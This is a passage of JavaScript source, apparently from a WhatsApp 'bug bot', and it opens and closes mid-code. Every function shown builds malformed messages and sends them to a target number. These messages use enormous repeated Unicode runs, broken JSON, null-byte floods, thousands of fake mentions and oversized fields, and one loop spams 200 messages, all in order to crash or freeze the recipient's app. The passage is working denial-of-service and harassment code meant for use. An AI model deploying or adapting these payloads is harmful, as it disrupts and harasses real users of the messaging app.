    const xcorewolkwer = {
      message: {
        protocolMessage: {
          type: "MAKLU BG",
          key: {
            remoteJid: target,
            fromMe: false,
            id: "XXXXXXX"
          }
        }
      }
    };

    await sock.sendMessage(target, begobagak);
    await sock.sendMessage(target, button);
    await sock.sendMessage(target, naksirmaklu);
    await sock.sendMessage(target, vidiobokep);
    await sock.sendMessage(target, ngentod);
    await sock.sendMessage(target, okebisabisa);

    for (let i = 0; i < 200; i++) {
      await sock.sendMessage(target, salsasange);
    }

    await sock.sendMessage(target, makluv1);
    await sock.sendMessage(target, abimfile);
    await sock.sendMessage(target, xcorewolkwer);

    console.log(`🧪 SUCCESS SEND → ${target}`);
  } catch (e) {
    console.error("❌ ERROR:", e);
  }
}

async function packBlank(target) {
console.log(chalk.red(`𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
  await sock.relayMessage(
    target,
    {
      stickerPackMessage: {
        stickerPackId: "X",
        name: "σƭαא ɦεɾε" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        publisher: "σƭαא ɦεɾε" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        stickers: [
          {
            fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
        ],
        fileLength: "9999999999999",
        fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
        fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
        mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
        directPath:
          "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",
        contextInfo: {
          quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                  creatorName: "Bot"
                }
            }
        },
        packDescription: "σƭαא ɦεɾε" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        mediaKeyTimestamp: "1741150286",
        trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
        thumbnailDirectPath:
          "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
        thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
        thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash:
          "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
        stickerPackSize: "999999999",
        stickerPackOrigin: "1",
      },
    }, { participant: { jid: target } });
}

async function LocaCrashUi2(target) {
console.log(chalk.red(`𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
  const otaxx = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
  locationMessage: {
          degreesLatitude: 11.11,
          degreesLongitude: -11.11,
          name: "DO YOU KNOW ME?¿ Ryanzz" + "ꦽ".repeat(60000),
          url: "https://t.me/Putxzyy",
          contextInfo: {
            externalAdReply: {
              quotedAd: {
                advertiserName: "ꦾ".repeat(60000),
                mediaType: "IMAGE",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                caption: "Ryanzz ιѕ нєяє"
              },
              placeholderKey: {
                remoteJid: "0@g.us",
                fromMe: true,
                id: "ABCDEF1234567890"
              }
            }
          }
        },
            hasMediaAttachment: true
          },
          body: {
            text: "нαιι ιм Ryanzz⸙"
          },
          nativeFlowMessage: {
            messageParamsJson: "{[",
            messageVersion: 3,
            buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },           
                {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                    "icon": "RIVIEW",
                    "flow_cta": "ꦽ".repeat(10000),
                    "flow_message_version": "3"
                })
              },      
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                    "icon": "RIVIEW",
                    "flow_cta": "ꦾ".repeat(10000),
                    "flow_message_version": "3"
                })
              },  
            ]
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, proto.Message.fromObject(otaxx), { userJid: target });
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
  
  await new Promise(r => setTimeout(r, 500));

  await sock.sendMessage(target, {
    delete: {
      fromMe: true,
      remoteJid: target,
      id: msg.key.id
    }
  });
}

async function InvisCall(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "༏ 𝐗𝐳𝐞𝐫𝐨༝𝐘𝐮𝐝𝐗 ༏",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(15000000),
            version: 3
          }
        },
        contextInfo: {
          participant: { jid: target },
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 1900 }, () =>
              `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
            )
          ]
        }
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: {
                  jid: target
                },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}
async function blanknih(target) {
  const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363321780343299@newsletter",
      newsletterName: "༏ 𝐗𝐳𝐞𝐫𝐨༝𝐘𝐮𝐝𝐗 ༏" + "ꦽꦾ".repeat(15000),
      caption: "༼༏ 𝐗𝐩𝐚𝐧𝐚𝐭𝐢𝐨𝐍 ༏༽" + "ꦽꦾ".repeat(15000),
      inviteExpiration: "9282682616283736",
    }
  };

  await sock.relayMessage(target, msg, {
    messageId: null,
    participant: { jid: target }
  });
}

async function CrashHit(target) {
  let msg2 = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "MAKLO ANJING",
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: -0,
                        },
                        hasMediaAttachment: false,
                    },
                    body: {
                        text: "ꦾ".repeat(60000) + "ោ៝".repeat(20000),
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: "",
                            },
                            {
                                name: "cta_call",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "ꦽ".repeat(5000),
                                }),
                            },
                            {
                                name: "cta_copy",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "ꦽ".repeat(5000),
                                }),
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "ꦽ".repeat(5000),
                                }),                         
                            },
                        ],
                        messageParamsJson: "[{".repeat(10000),
                    },
                    contextInfo: {
                        participant: target,
                        mentionJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 1900 },
                                () => "1" + Math.floor(Math.random() * 50000000) + "0@s.whatsapp.net",
                            ),
                        ],
                        quotedMessage: {
                            paymentInviteMessage: {
                                serviceType: 3,
                                expiryTimeStamp: Date.now() + 1814400000,
                            },
                        },
                    },
                },
            },
        },
    };
}

async function Sparkblank(target) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 70000) + "@s.whatsapp.net")
              ],
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimeStamp: Math.floor(Date.now())
                }
              },
              externalAdReply: {
                renderLargerThumbnail: true,
                thumbnailUrl: "https://wa.me/stickerpack/zieziadnan",
                sourceUrl: "https://t.me/Xwarrxxx",
                showAdAttribution: true,
                body: "ꉧꅐꋬꋪꋪꋪꋪ ꒒ꄲ꒒ꇙꇙꇙ",
                title: "ꉧꅐꋬꋪꋪꋪꋪ ꒒ꄲ꒒ꇙꇙꇙ"
              }
            },
            body: {
              text: "ꉧꅐꋬꋪꋪꋪꋪ ꒒ꄲ꒒ꇙꇙꇙ" + "ꦾ".repeat(45000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                { name: "single_select", buttonParamsJson: "" },
                { name: "call_permission_request", buttonParamsJson: "" }
              ]
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });

  const payXFreeze = JSON.stringify({
    request_type: "ui_zieziadnan",
    payload: "ꦾ".repeat(75000) + "ꦾ".repeat(500),
    version: "x",
    crash_id: Math.floor(Math.random() * 999999),
    experimental: true
  });

  const payXBlank = JSON.stringify({
    request_type: "AmeliaHellboy",
    payload: "𑇂𑆵𑆴𑆿".repeat(10000) + "𑇂𑆵𑆴𑆿".repeat(1000),
    version: "Lanz",
    crash_id: Math.floor(Math.random() * 999999),
    experimental: true
  });

  const Xwarmsg = generateWAMessageFromContent(
    target,
    {
      documentMessage: {
        url: undefined,
        mimetype: "application",
        fileName: "undefined",
        fileLength: 9999999,
        pageCount: 1,
        caption: "ꉧꅐꋬꋪꋪꋪꋪ ꒒ꄲ꒒ꇙꇙꇙ",
        name: "galaxy_message",
        paramsJson: payXBlank,
        payment_message: {
          note: "ꉧꅐꋬꋪꋪꋪꋪ ꒒ꄲ꒒ꇙꇙꇙ",
          paramsJson: payXFreeze
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, Xwarmsg.message, {
    messageId: Xwarmsg.key.id
  });
  
  const callUiMsg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
                initiatorDeviceJid: target,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: null
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            body: {
              text: "HALO QHAQHA" + "ꦾ".repeat(70000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                { name: "single_select", buttonParamsJson: "" },
                { name: "call_permission_request", buttonParamsJson: "" }
              ]
            }
          }
        }
      }
    },
    {}
  );
  await sock.relayMessage(target, callUiMsg.message, {
    messageId: callUiMsg.key.id,
    participant: { jid: target }
  });
  await sock.sendMessage(target, { text: teks, contextInfo: { mentionedJid: spamMention } });
}

//Ui
async function blankxzvr(target) {
    const xwarxara = await generateWaMessageFromcontent(target,  {
    message: {
      interactiveMessage: {
        header: {
          documentMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
            mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
            fileLength: "1402222",
            pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
            fileName: "xwarrxxx.js",
            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
            directPath: "//v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
            mediaKeyTimestamp: `1750124469`
          },
          hasMediaAttachment: true
        },
        body: {
          text: "Ӿ₩₳ɽɽ Ł₴ Ⱨɇɽɇɇɇɇ" + "{".repeat(70000)
        },
        nativeFlowMessage: {
              messageParamsJson: "{".repeat(90000)
        },
        contextInfo: {
          mentionedJid: [target],
          groupMentions: [
            {
              groupJid: target,
              groupSubject: "ALL_CHAT",
              groupMetadata: {
                creationTimestamp: Date.now(),
                ownerJid: "1@s.whatsapp.net",
                adminJids: ["1@s.whatsapp.net", "1@s.whatsapp.net"]
              }
            }
          ],
          externalContextInfo: {
            customTag: "₣ʉ₵₭ Ɏøʉ ฿ɽøøøø",
            securityLevel: 0,
            referenceCode: 9741,
            timestamp: 9741,
            messageId: `MSG_${Math.random().toString(36).slice(2)}`,
            userId: "global"
          },
          isForwarded: true,
          quotedMessage: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "1402222",
              pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
              mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
              fileName: "xwarrrx.js",
              fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
              directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
              mediaKeyTimestamp: 1750124469
            }
          }
        }
      }
    }
  }, {});
      await sock.relayMessage(target, xwarxara.message, {
        participant: { jid: target },
        messageId: msg.key.id
      });
   
    await sock.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: ".",
                        locationMessage: {},
                        hasMediaAttachment: true
                    },
                    body: {
                        text: " null " + "\0".repeat(900000)
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "\0"
                    },
                    carouselMessage: {}
                }
            }
        }
    }, { participant: { jid: target } });
  
  console.log(`Succes Send Bug ${target}`);
  
}
async function LocaliveUI(target) {
  try {
    await sock.sendMessage(target, {
      location: {
        degreesLatitude: -0,
        degreesLongitude: 0,
        name: "Poppies Lane Memory ( Ziee ⸙ )" + "ꦾ".repeat(10000) + "ꦽ".repeat(10000) + "𑜦𑜠".repeat(10000) + "~@1~".repeat(10000),
        address: " "
      }
    })

    await sock.sendMessage(target, {
      liveLocationMessage: {
        degreesLatitude: -0,
        degreesLongitude: 0,
        accuracyInMeters: 5,
        speedInMps: 0,
        degreesClockwiseFromMagneticNorth: 0,
        caption: " ",
        sequenceNumber: 1,
        timeOffset: 0
      }
    })

  } catch (err) {
  }
}
async function galleryBugUI(target) {
  try {
    const zieeMsg = {
      groupInviteMessage: {
        groupJid: "0@g.us",
        inviteCode: "ZIEE1234",
        inviteExpiration: 9999999999,
        groupName: " ",
        caption:
          "Poppies Lane Memory ( Ziee ⸙ )" +
          "ꦾ".repeat(10000) +
          "ꦽ".repeat(10000) +
          "𑜦𑜠".repeat(10000) +
          "~@1~".repeat(10000)
      },
      nativeFlowMessage: {
        messageParamsJson: "{}".repeat(50000),
        buttons: [
          { name: "open_gallery", buttonParamsJson: "1" }
        ]
      }
    }
    await sock.relayMessage(target, zieeMsg, { messageId: "ZIEE_" + Date.now() })
  } catch (e) {
  }
}
async function Uipayload(target) {
  try {
    const payload = {
      viewOnceMessageV2: {
        message: {
          extendedTextMessage: {
            text: "Poppies Lane Memory ( Ziee ⸙ )" + "ꦾ".repeat(20000),
            contextInfo: {
              externalAdReply: {
                title: "..."+"ꦾ".repeat(20000),
                body: "",
                thumbnailUrl: "https://files.catbox.moe/ibub9i.jpg",
                mediaType: 1,
                renderLargerThumbnail: true,
                sourceUrl: "https://..."
              }
            }
          }
        }
      }
    }

    const msg = generateWAMessageFromContent(target, payload, {})
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id })
  } catch (e) {
  }
}
async function NotifUI(target) {
  await sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: { title: " " },
            body: { text: "Sharfinā1st 永遠に生きる" + "ꦾ".repeat(10000) + "ꦽ".repeat(10000) },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(20000),
                    id: "ok_btn"
                  })
                }
              ]
            }
          }
        }
      }
    },
    { participant: { jid: target } }
  );
}
async function zwspCrashUi(target) {
  const bujanginam = "https://files.catbox.moe/r4a601.jpg";
  if (!sock || !target) return;

  try {
    if (sock.presenceSubscribe) {
      await sock.presenceSubscribe(target).catch(() => {});
    }
    if (sock.sendPresenceUpdate) {
      await sock.sendPresenceUpdate("composing", target).catch(() => {});
    }

    const mentionBujang = [target];

    await sock.sendMessage(target, {
      image: { url: bujanginam },
      caption:
        "Poppies Lane Memory ( Ziee ⸙ )" + "ꦾ".repeat(10000) + "ꦽ".repeat(10000) + "𑜦𑜠".repeat(10000) + "~@1~".repeat(100000),
      mentions: mentionBujang
    });

    await sock.sendMessage(target, {
      text: "zwsp" + "\u200B".repeat(50000),
      mentions: mentionBujang
    });

  } catch (err) {
  }
}
async function HardLocUI(target) {
  try {
    const zieeBtn = [
      {
        buttonId: ".id1",
        buttonText: {
          displayText: "𑜦𑜠".repeat(20000)
        },
        type: 1
      },
      {
        buttonId: ".id2",
        buttonText: {
          displayText: "𑜦𑜠".repeat(20000)
        },
        type: 1
      },
      {
        buttonId: ".id3",
        buttonText: {
          displayText: "𑜦𑜠".repeat(20000)
        },
        type: 1
      }
    ];

    const zieeMsg = {
      location: {
        degreesLatitude: -1,
        degreesLongitude: -1,
        name: "Sharfinā1st 永遠に生きる" + "ꦾ".repeat(15000) + "ꦽ".repeat(15000),
        address: "Sharfinā1st 永遠に生きる" + "ꦾ".repeat(15000) + "ꦽ".repeat(15000)
      },
      caption: "Sharfinā1st 永遠に生きる" + "ꦾ".repeat(15000) + "ꦽ".repeat(15000),
      footer: " ",
      zieeBtn,
      headerType: 6
    };

    await sock.sendMessage(target, zieeMsg);
  } catch (err) {
  }
}
async function HxDSnake(target) {
  const ElHxD = {
    viewOnceMessage: {
      message: {
        stickerPackMessage: {
          stickerPackId: "91719AJW-1AE91-12FE-bB2b-1927182HQBSO",
          name: "ꦾ".repeat(70000),
          publisher: "HxD Is Here !!!" + "꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ 